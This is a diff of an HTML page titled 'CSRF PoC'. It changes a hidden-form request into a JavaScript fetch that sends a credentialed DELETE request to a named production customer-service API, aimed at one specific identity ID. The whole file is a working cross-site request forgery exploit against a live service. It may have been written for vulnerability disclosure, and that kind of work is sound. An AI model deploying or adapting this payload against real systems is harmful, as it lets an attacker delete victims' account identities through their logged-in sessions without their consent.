@@ -4,10 +4,19 @@
     <title>CSRF PoC</title>
   </head>
   <body>
-    <h3>Click the button to trigger the CSRF request</h3>
-    <form action="https://api.prd.telenet.be/ocapi/public/api/customer-service/v1/identities/19356750" method="POST">
-      <input type="hidden" name="_method" value="DELETE">
-      <input type="submit" value="Submit CSRF">
-    </form>
+    <h3>Click to send CSRF DELETE request</h3>
+    <button onclick="sendCSRF()">Delete Identity</button>
+
+    <script>
+      function sendCSRF() {
+        fetch("https://api.prd.telenet.be/ocapi/public/api/customer-service/v1/identities/19356750", {
+          method: "DELETE",
+          credentials: "include"
+        })
+        .then(response => response.text())
+        .then(data => console.log("Response:", data))
+        .catch(err => console.error("Error:", err));
+      }
+    </script>
   </body>
 </html>
